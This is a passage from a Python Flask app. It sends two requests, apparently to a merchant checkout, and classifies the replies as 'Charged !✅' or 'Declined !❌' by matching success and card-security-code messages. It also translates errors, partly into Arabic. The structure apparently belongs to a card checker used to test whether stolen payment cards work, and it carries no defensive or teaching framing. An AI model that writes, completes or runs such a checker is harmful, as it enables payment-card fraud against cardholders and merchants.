                data=data2,
            )

            # Combine responses for analysis
            combined_msg = ""
            if response1.text:
                combined_msg += response1.text
            if response2.text:
                combined_msg += response2.text

            # Apply the rule
            if 'success' in combined_msg or 'Thank you for your order.' in combined_msg or 'successed' in combined_msg or 'Thank you' in combined_msg or 'Payment Successful' in combined_msg:
                return jsonify({'status': 'success', 'message': 'Charged !✅'})
            elif "The card's security code is incorrect." in combined_msg:
                return jsonify({'status': 'error', 'message': "رمز الأمان غير صحيح ❌"})
            else:
                # Search for "message" in responses
                import json
                try:
                    resp1_json = response1.json()
                    if 'message' in resp1_json:
                        translated_message = translate_error_message(resp1_json['message'])
                        return jsonify({'status': 'error', 'message': translated_message})
                except:
                    pass
                try:
                    resp2_json = response2.json()
                    if 'message' in resp2_json:
                        translated_message = translate_error_message(resp2_json['message'])
                        return jsonify({'status': 'error', 'message': translated_message})
                except:
                    pass
                
                return jsonify({'status': 'error', 'message': 'Declined !❌'})
        
        return jsonify({'status': 'error', 'message': 'Payment processing failed'})

if __name__ == '__main__':
    app.run(debug=True)
